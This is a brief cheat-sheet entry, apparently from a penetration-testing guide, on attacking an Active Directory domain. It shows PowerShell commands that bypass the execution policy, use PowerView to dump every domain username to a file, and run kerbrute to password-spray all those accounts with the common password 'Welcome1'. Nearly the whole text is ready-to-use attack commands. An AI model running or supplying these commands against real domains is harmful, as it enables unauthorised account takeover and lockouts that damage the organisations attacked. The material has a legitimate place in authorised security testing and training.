#  We will gather AD_Users using PowerView then passwordspray with kerbrute
On Powershell
```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt
Get-Content .\adusers.txt | select -First 10
```
Using Kerbrute with testing week credits 'Welcome1'

```powershell
.\kerbrute.exe passwordspray -d DOMAIN.LOCAL .\adusers.txt Welcome1
```
